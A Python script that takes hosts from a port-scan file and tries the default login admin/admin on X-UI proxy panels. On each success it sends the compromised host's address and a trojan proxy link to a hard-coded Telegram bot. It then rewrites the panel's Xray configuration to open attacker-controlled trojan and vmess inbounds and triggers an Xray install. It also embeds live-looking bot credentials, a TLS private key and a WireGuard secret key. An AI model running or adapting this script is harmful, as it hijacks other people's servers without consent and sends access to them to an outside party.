import re
import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor

TOKEN = "7306762047:AAFu-ykDYHiPoTJlQSdK5Sqm7cJcK0dT7Ws"
CHAT_ID = "-1002267977332"

data = {
    'username': 'admin',
    'password': 'admin'
}

def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}?fields=countryCode,as"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            ip_info = response.json()
            country_code = ip_info.get('countryCode', 'N/A')
            as_number = ip_info.get('as', 'N/A')
            return country_code, as_number
    except requests.exceptions.RequestException:
        pass
    return 'N/A', 'N/A'

def send_telegram_message(message):
    url_push = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data_push = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url_push, json=data_push, timeout=10)
        response.raise_for_status()
        if response.json().get("ok", False):
            print("推送成功")
    except requests.exceptions.RequestException as e:
        print(f"推送失败: {e}")

def try_login(ip, protocol, port):
    trojan_password = "Y8xckxoQX8cdHhqL91xJ"
    trojan_port = 39039
    url = f"{protocol}://{ip}:{port}/login"
    for _ in range(3):
        try:
            response = requests.post(url, data=data, timeout=2, verify=(protocol == "https"))
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    if isinstance(response_data, dict) and response_data.get("success"):
                        country_code, as_number = get_ip_info(ip)
                        # Generate result link
                        result = f"trojan://{trojan_password}@{ip}:{trojan_port}/?security=tls&sni=bing.com&allowInsecure=1&type=ws&path=/fucku&host=bing.com#{country_code}[{as_number}]{ip}"
                        with open("succeed.txt", "a") as xui_file:
                            xui_file.write(result + '\n')

                        # Send Trojan link in Markdown format
                        message = (
                            f"IP: http://{ip}:{port}\n"
                            f"ISP: {as_number}\n"
                            f"Local: {country_code}\n\n"
                            f"`{result}`"
                        )
                        send_telegram_message(message)

                        # Update settings
                        setting_update_url = f"{protocol}://{ip}:{port}/xui/setting/update"
                        setting_update_body = {
                            'webListen': '',
                            'webPort': 54321,
                            'webCertFile': '',
                            'webKeyFile': '',
                            'webBasePath': '/',
                            'xrayTemplateConfig': f'''
                            {{
                                "api": {{
                                    "services": [
                                        "HandlerService",
                                        "LoggerService",
                                        "StatsService"
                                    ],
                                    "tag": "api"
                                }},
                                "inbounds": [
                                    {{
                                        "listen": "127.0.0.1",
                                        "port": 62789,
                                        "protocol": "dokodemo-door",
                                        "settings": {{
                                            "address": "127.0.0.1"
                                        }},
                                        "tag": "api"
                                    }},
                                    {{
                                        "listen": null,
                                        "port": {trojan_port},
                                        "protocol": "trojan",
                                        "settings": {{
                                            "clients": [
                                                {{
                                                    "password": "{trojan_password}"
                                                }}
                                            ],
                                            "fallbacks": []
                                        }},
                                        "sniffing": {{
                                            "destOverride": [
                                                "http",
                                                "tls"
                                            ],
                                            "enabled": true
                                        }},
                                        "streamSettings": {{
                                            "network": "ws",
                                            "security": "tls",
                                            "tlsSettings": {{    
                                                "certificates": [
                                                    {{
                                                        "certificate": [
                                                            "-----BEGIN CERTIFICATE-----",
                                                            "MIIBfjCCASOgAwIBAgIUOAmyyu6MPkKA96FzOskC2gG8uk8wCgYIKoZIzj0EAwIw",
                                                            "EzERMA8GA1UEAwwIYmluZy5jb20wIBcNMjQwMjEwMDgwNTAwWhgPMjEyNDAxMTcw",
                                                            "ODA1MDBaMBMxETAPBgNVBAMMCGJpbmcuY29tMFkwEwYHKoZIzj0CAQYIKoZIzj0D",
                                                            "AQcDQgAEKdltiO15Qj4fu5Yc0IJsnCh7AJZZre5YEjIXfpp9yMwq/MWvyzRkClEG",
                                                            "U3imkk4w8oxRx5rOTCJzYRfkOiAJLaNTMFEwHQYDVR0OBBYEFC5Rn33Ioi7PJlhJ",
                                                            "58VH5qgeIDlPMB8GA1UdIwQYMBaAFC5Rn33Ioi7PJlhJ58VH5qgeIDlPMA8GA1Ud",
                                                            "EwEB/wQFMAMBAf8wCgYIKoZIzj0EAwIDSQAwRgIhAOovOO7FVMPkOl1rs87BRn5A",
                                                            "Ggb7PkWtYCtTE+lLrvTYAiEAu5v6FhjOG2p46e2CkQA2ls7dfaRrRKtL8tNcuLQz",
                                                            "naY=",
                                                            "-----END CERTIFICATE-----"
                                                        ],
                                                        "key": [
                                                            "-----BEGIN PRIVATE KEY-----",
                                                            "MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgFX5SI9gUqxD+ekAg",
                                                            "FEb0xUQLso2j1rfDU5lh9BdPgJ+hRANCAAQp2W2I7XlCPh+7lhzQgmycKHsAllmt",
                                                            "7lgSMhd+mn3IzCr8xa/LNGQKUQZTeKaSTjDyjFHHms5MInNhF+Q6IAkt",
                                                            "-----END PRIVATE KEY-----"
                                                        ],
                                                        "ocspStapling": 3600
                                                    }}
                                                ]
                                            }},
                                            "wsSettings": {{
                                                "headers": {{}},
                                                "path": "/fucku"
                                            }}
                                        }}
                                    }},
                                    {{
                                        "port": 23556,
                                        "listen": null,
                                        "protocol": "vmess",
                                        "settings": {{
                                          "clients": [
                                            {{
                                              "id": "faf171ee-d211-4e25-a645-6ac087e48bfb",
                                              "alterId": 0
                                            }}
                                          ]
                                        }},
                                        "streamSettings": {{
                                          "network": "ws",
                                          "wsSettings": {{
                                            "path": "/demo.mp4"
                                          }}
                                        }}
                                    }}
                                ],
                                "outbounds": [
                                    {{
                                        "protocol": "freedom",
                                        "settings": {{}}
                                    }},
                                    {{
                                        "protocol": "blackhole",
                                        "settings": {{}},
                                        "tag": "blocked"
                                    }},
                                    {{
                                        "tag": "WARP",
                                        "protocol": "wireguard",
                                        "settings": {{
                                            "secretKey": "wBgj79mhiENspSFQHIULqHP8IKFJJcdq37R51DJvDlk=",
                                            "address": [
                                                "172.16.0.2/32"
                                            ],
                                            "peers": [
                                                {{
                                                    "publicKey": "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=",
                                                    "allowedIPs": [
                                                        "0.0.0.0/0",
                                                        "::/0"
                                                    ],
                                                    "endpoint": "engage.cloudflareclient.com:2408"
                                                }}
                                            ],
                                            "reserved": [249, 159, 96]
                                        }}
                                    }}
                                ],
                                "policy": {{
                                    "system": {{
                                        "statsInboundDownlink": true,
                                        "statsInboundUplink": true
                                    }}
                                }},
                                "routing": {{
                                    "rules": [
                                        {{
                                            "inboundTag": [
                                                "api"
                                            ],
                                            "outboundTag": "api",
                                            "type": "field"
                                        }},
                                        {{
                                            "type": "field",
                                            "outboundTag": "WARP",
                                            "domain": ["geosite:abema", "colorfulpalette.org"]
                                        }},
                                        {{
                                            "ip": [
                                                "geoip:private"
                                            ],
                                            "outboundTag": "blocked",
                                            "type": "field"
                                        }},
                                        {{
                                            "outboundTag": "blocked",
                                            "protocol": [
                                                "bittorrent"
                                            ],
                                            "type": "field"
                                        }}
                                    ]
                                }},
                                "stats": {{}}
                            }}
                            ''',
                            'timeLocation': 'Asia/Shanghai',
                        }
                        try:
                            setting_update_response = requests.post(
                                setting_update_url,
                                json=setting_update_body,
                                cookies=response.cookies.get_dict(),
                                timeout=5
                            )
                            print("Body: " + setting_update_response.text)
                        except Exception as e:
                            print(str(e))

                        # Install Xray
                        install_url = f"http://{ip}:{port}/server/installXray/v1.7.5"
                        try:
                            install_response = requests.post(install_url, cookies=response.cookies.get_dict(), timeout=5)
                            print("Install Response Body: " + install_response.text)
                        except Exception as e:
                            print(str(e))
                        return result
                except ValueError:
                    return f"Invalid JSON response from: {url}"
        except requests.exceptions.RequestException:
            pass
    return f"{ip}:{port} Def"

def process_ip(ip_line):
    match = re.match(r".*Host:\s+(\d+\.\d+\.\d+\.\d+).*Ports:\s+(\d+)", ip_line)
    if match:
        ip = match.group(1)
        port = match.group(2)
        result = try_login(ip, "http", port) or try_login(ip, "https", port)
        if result:
            print(result)

if __name__ == "__main__":
    with open("scan.txt", "r") as file:
        ip_lines = [line.strip() for line in file if "Host:" in line and "Ports:" in line]

    with ThreadPoolExecutor() as executor:
        executor.map(process_ip, ip_lines)
